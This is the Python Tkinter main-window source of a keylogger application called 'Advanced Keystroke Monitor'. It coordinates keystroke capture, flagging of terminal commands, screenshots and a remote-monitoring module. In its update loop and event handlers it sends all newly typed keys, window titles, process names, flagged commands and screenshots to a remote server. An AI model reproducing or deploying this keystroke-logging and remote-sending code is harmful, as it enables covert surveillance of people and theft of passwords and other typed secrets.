"""
Main application window for the keylogger
"""

import tkinter as tk
from tkinter import messagebox, filedialog
import threading
import time
import os
import base64

from keylogger.input_monitor import InputMonitor
from keylogger.command_detector import CommandDetector
from keylogger.data_manager import DataManager
from keylogger.remote_monitor import RemoteMonitor
from keylogger.screenshot_manager import ScreenshotManager
from gui.monitor_tab import MonitorTab
from gui.flags_tab import FlagsTab
from gui.remote_tab import RemoteTab
from gui.screenshots_tab import ScreenshotsTab
from gui.utils.styles import COLORS, BUTTON_STYLES, FRAME_STYLES, LABEL_STYLES

class KeyloggerApp:
    def __init__(self, root):
        """
        Initialize the main application window
        
        Args:
            root: Tkinter root window
        """
        self.root = root
        self.root.title("Advanced Keystroke Monitor")
        self.root.geometry("900x650")
        self.root.minsize(800, 600)
        self.root.resizable(True, True)
        
        # Set window icon if available
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            icon_path = os.path.join(script_dir, "..", "resources", "icon.ico")
            if os.path.exists(icon_path):
                self.root.iconbitmap(icon_path)
        except:
            pass
        
        # Set theme color
        self.root.configure(bg=COLORS["bg_light"])
        
        # Initialize modules
        self.input_monitor = InputMonitor(callback=self.on_input_event)
        self.command_detector = CommandDetector()
        self.data_manager = DataManager()
        self.remote_monitor = RemoteMonitor(callback=self.on_remote_event)
        self.screenshot_manager = ScreenshotManager(callback=self.on_screenshot_event)
        
        # State variables
        self.logging_active = False
        self.current_tab = "monitor"
        self.screenshots = []  # Local storage for screenshots
        
        # Create the GUI
        self.create_widgets()
        
        # Start update thread
        self.update_thread = threading.Thread(target=self.update_loop)
        self.update_thread.daemon = True
        self.update_thread.start()
        
        # Bind close event
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        
    def create_widgets(self):
        """Create the application widgets"""
        # Main frame
        self.main_frame = tk.Frame(self.root, **FRAME_STYLES["main"])
        self.main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Header with app title
        header_frame = tk.Frame(self.main_frame, **FRAME_STYLES["header"])
        header_frame.pack(fill=tk.X)
        
        title_label = tk.Label(header_frame, text="Advanced Keystroke Monitor", **LABEL_STYLES["header"])
        title_label.pack(pady=5)
        
        # Create tab control
        self.tab_control = tk.Frame(self.main_frame, bg=COLORS["bg_light"])
        self.tab_control.pack(fill=tk.X, pady=5)
        
        self.monitor_button = tk.Button(self.tab_control, text="Monitoring", 
                                       command=lambda: self.show_tab("monitor"),
                                       **BUTTON_STYLES["tab_active"])
        self.monitor_button.pack(side=tk.LEFT, padx=2)
        
        self.flags_button = tk.Button(self.tab_control, text="Command Flags", 
                                     command=lambda: self.show_tab("flags"),
                                     **BUTTON_STYLES["tab"])
        self.flags_button.pack(side=tk.LEFT, padx=2)
        
        self.screenshots_button = tk.Button(self.tab_control, text="Screenshots", 
                                          command=lambda: self.show_tab("screenshots"),
                                          **BUTTON_STYLES["tab"])
        self.screenshots_button.pack(side=tk.LEFT, padx=2)
        
        self.remote_button = tk.Button(self.tab_control, text="Remote Monitoring", 
                                     command=lambda: self.show_tab("remote"),
                                     **BUTTON_STYLES["tab"])
        self.remote_button.pack(side=tk.LEFT, padx=2)
        
        # Content frame
        self.content_frame = tk.Frame(self.main_frame, bg=COLORS["bg_light"])
        self.content_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # Create tab frames
        self.tabs = {}
        
        # Monitor tab
        self.tabs["monitor"] = MonitorTab(self.content_frame, self)
        
        # Flags tab
        self.tabs["flags"] = FlagsTab(self.content_frame, self)
        
        # Screenshots tab
        self.tabs["screenshots"] = ScreenshotsTab(self.content_frame, self)
        
        # Remote tab
        self.tabs["remote"] = RemoteTab(self.content_frame, self)
        
        # Status bar
        self.status_bar = tk.Frame(self.main_frame, bg=COLORS["bg_light"], 
                                  borderwidth=1, relief="sunken")
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM)
        
        self.status_label = tk.Label(self.status_bar, text="Status: Ready", **LABEL_STYLES["status"])
        self.status_label.pack(side=tk.LEFT, padx=5)
        
        # Remote status indicator
        footer_style = LABEL_STYLES["footer"].copy()  # Make a copy to modify
        footer_style["fg"] = COLORS["accent"]  # Override the fg parameter
        self.remote_status_label = tk.Label(self.status_bar, text="Remote: Disabled", 
                                         **footer_style)
        self.remote_status_label.pack(side=tk.RIGHT, padx=10)
        
        # Version info
        version_label = tk.Label(self.status_bar, text="v1.0.0", **LABEL_STYLES["footer"])
        version_label.pack(side=tk.RIGHT, padx=5)
        
        # Show default tab
        self.show_tab("monitor")
        
    def show_tab(self, tab_name):
        """Show the specified tab"""
        # Skip if already on this tab
        if self.current_tab == tab_name:
            return
            
        # Hide all tabs
        for tab in self.tabs.values():
            tab.hide()
        
        # Show the selected tab
        self.tabs[tab_name].show()
        self.current_tab = tab_name
        
        # Update button colors
        self.monitor_button.configure(**BUTTON_STYLES["tab"])
        self.flags_button.configure(**BUTTON_STYLES["tab"])
        self.screenshots_button.configure(**BUTTON_STYLES["tab"])
        self.remote_button.configure(**BUTTON_STYLES["tab"])
        
        if tab_name == "monitor":
            self.monitor_button.configure(**BUTTON_STYLES["tab_active"])
        elif tab_name == "flags":
            self.flags_button.configure(**BUTTON_STYLES["tab_active"])
        elif tab_name == "screenshots":
            self.screenshots_button.configure(**BUTTON_STYLES["tab_active"])
        elif tab_name == "remote":
            self.remote_button.configure(**BUTTON_STYLES["tab_active"])
            
    def toggle_logging(self):
        """Toggle the logging state"""
        if not self.logging_active:
            self.start_logging()
        else:
            self.stop_logging()
            
    def start_logging(self):
        """Start logging"""
        self.logging_active = True
        self.input_monitor.start()
        
        # Start screenshot manager if configured
        if self.tabs["screenshots"].auto_capture_var.get():
            interval = int(self.tabs["screenshots"].interval_var.get())
            self.screenshot_manager.start_auto_capture(interval)
            
        self.tabs["monitor"].update_status(True)
        self.status_label.configure(text="Status: Monitoring Active", fg=COLORS["success"])
            
    def stop_logging(self):
        """Stop logging"""
        self.logging_active = False
        self.input_monitor.stop()
        self.screenshot_manager.stop_auto_capture()
        self.tabs["monitor"].update_status(False)
        self.status_label.configure(text="Status: Monitoring Stopped", fg=COLORS["accent"])
        
    def on_input_event(self, event_type, *args):
        """
        Handle input events from the input monitor
        
        Args:
            event_type: Type of event (keypress, window_change, etc.)
            *args: Additional arguments depending on the event type
        """
        if event_type == "keypress":
            # Check for command on each keystroke
            self.check_for_command()
                
        elif event_type == "enter_pressed":
            # This event is triggered when Enter is pressed, with the completed line
            command_line = args[0]
            self.check_command_on_enter(command_line)
            
        elif event_type == "window_change":
            title, process = args
            self.tabs["monitor"].update_window_info(title, process)
            
            # Update status bar
            self.status_label.configure(text=f"Status: Monitoring - {title[:30]}..." 
                                      if len(title) > 30 else f"Status: Monitoring - {title}")
            
            # Send to remote server if enabled
            if self.remote_monitor.remote_enabled and self.remote_monitor.running:
                self.remote_monitor.send_log({
                    "event": "window_change",
                    "title": title,
                    "process": process
                })
    
    def on_remote_event(self, event_type, *args):
        """
        Handle events from the remote monitoring module
        
        Args:
            event_type: Type of event
            *args: Additional arguments
        """
        if event_type == "status_update":
            status = args[0]
            # Update the remote status in the status bar
            if "Connected" in status:
                self.remote_status_label.config(text=f"Remote: {status}", fg=COLORS["success"])
            elif "Error" in status:
                self.remote_status_label.config(text=f"Remote: {status}", fg=COLORS["accent"])
            else:
                self.remote_status_label.config(text=f"Remote: {status}", fg=COLORS["warning"])
                
            # Update the remote tab if it's visible
            if self.current_tab == "remote":
                self.tabs["remote"].update_status_display()
                
    def on_screenshot_event(self, event_type, screenshot_data):
        """Handle events from the screenshot manager"""
        if event_type == "screenshot_taken":
            self.screenshots.append(screenshot_data)
            self.tabs["screenshots"].add_screenshot(screenshot_data)
            
            # Send to remote server if enabled
            if self.remote_monitor.remote_enabled and self.remote_monitor.running:
                self.remote_monitor.send_screenshot(
                    base64.b64decode(screenshot_data["image"])
                )
    
    def check_for_command(self):
        """Check for commands during typing"""
        window_info = self.input_monitor.get_current_window_info()
        
        # Only check in command-line windows
        if self.command_detector.is_command_window(window_info["title"], window_info["process"]):
            current_input = self.input_monitor.get_current_input()
            
            # Check for flagged commands
            flag = self.command_detector.check_for_flagged_commands(current_input, window_info)
            if flag:
                # Update flags tab
                self.tabs["flags"].add_flag(flag)
                
                # If not already on the flags tab, update the button to indicate new flags
                if self.current_tab != "flags":
                    self.flags_button.configure(bg=COLORS["warning"], fg=COLORS["text_dark"])
                    
                # Send to remote server if enabled
                if self.remote_monitor.remote_enabled and self.remote_monitor.running:
                    self.remote_monitor.send_flag(flag)
    
    def check_command_on_enter(self, command_line):
        """Check for commands when Enter is pressed"""
        window_info = self.input_monitor.get_current_window_info()
    
        # Only check in command-line windows
        if self.command_detector.is_command_window(window_info["title"], window_info["process"]):
            # Check for flagged commands
            flag = self.command_detector.check_for_flagged_commands(command_line, window_info)
            if flag:
                print(f"Flagged command detected: {flag['command']}")  # Debug print
            
                # Update flags tab
                self.tabs["flags"].add_flag(flag)
            
                # Take screenshot if flagged
                if self.screenshot_manager.capture_on_flags:
                    print("Taking screenshot for flagged command...")  # Debug print
                    screenshot = self.screenshot_manager.take_flagged_screenshot(flag)
                    if screenshot:
                        print("Screenshot captured successfully")  # Debug print
                        self.screenshots.append(screenshot)
                        self.tabs["screenshots"].add_screenshot(screenshot)
                    
                        # Send to remote server if enabled
                        if self.remote_monitor.remote_enabled and self.remote_monitor.running:
                            self.remote_monitor.send_screenshot(
                                base64.b64decode(screenshot["image"]),
                                related_flag=flag
                            )
                    else:
                        print("Screenshot capture failed")  # Debug print
                else:
                    print("Flag capture is disabled")  # Debug print
            
                # ... rest of the method
            
    def update_loop(self):
        """Update the GUI periodically"""
        last_sent_length = 0  # Track how much we've already sent
        
        while True:
            try:
                if self.logging_active:
                    # Update the monitor tab with the latest keys
                    keys = self.input_monitor.get_keys()
                    self.tabs["monitor"].update_display(keys)
                    
                    # Periodically send key data to remote server if enabled
                    if self.remote_monitor.remote_enabled and self.remote_monitor.running:
                        # Only send new content since last update
                        current_length = len(keys)
                        if current_length > last_sent_length:
                            new_content = ''.join(keys[last_sent_length:])
                            self.remote_monitor.send_log({
                                "event": "keylog_update",
                                "data": new_content
                            })
                            last_sent_length = current_length
            except:
                # Catch any exceptions in the update loop
                pass
                
            time.sleep(0.1)  # Update every 100ms
            
    def take_screenshot(self):
        """Manually take a screenshot"""
        screenshot = self.screenshot_manager.capture_screenshot()
        if screenshot:
            self.screenshots.append(screenshot)
            self.tabs["screenshots"].add_screenshot(screenshot)
            
            # Send to remote server if enabled
            if self.remote_monitor.remote_enabled and self.remote_monitor.running:
                self.remote_monitor.send_screenshot(
                    base64.b64decode(screenshot["image"])
                )
            
    def save_log(self):
        """Save the keylog to a file"""
        keys = self.input_monitor.get_keys()
        
        # Ask user for save location
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")],
            initialfile=f"keylog_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        )
        
        if not file_path:
            return  # User cancelled
            
        success, message = self.data_manager.save_log(keys, file_path)
        
        if success:
            messagebox.showinfo("Success", message)
        else:
            messagebox.showerror("Error", message)
            
    def save_flags(self):
        """Save the flagged commands to a file"""
        flags = self.command_detector.get_flags()
        
        # Ask user for save location
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")],
            initialfile=f"flagged_commands_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        )
        
        if not file_path:
            return  # User cancelled
            
        success, message = self.data_manager.save_flags(flags, file_path)
        
        if success:
            messagebox.showinfo("Success", message)
        else:
            messagebox.showerror("Error", message)
            
    def clear_log(self):
        """Clear the keylog"""
        self.input_monitor.clear_keys()
        self.tabs["monitor"].update_display([])
        
    def clear_flags(self):
        """Clear the flagged commands"""
        self.command_detector.clear_flags()
        self.tabs["flags"].clear_flags()
        
        # Reset flags button appearance
        if self.current_tab != "flags":
            self.flags_button.configure(**BUTTON_STYLES["tab"])
            
    def on_close(self):
        """Handle application closing"""
        if self.logging_active:
            if messagebox.askyesno("Confirm Exit", "Monitoring is still active. Are you sure you want to exit?"):
                self.stop_logging()
                
                # Stop remote monitoring if active
                if self.remote_monitor.running:
                    self.remote_monitor.stop()
                    
                self.root.destroy()
        else:
            # Stop remote monitoring if active
            if self.remote_monitor.running:
                self.remote_monitor.stop()
                
            self.root.destroy()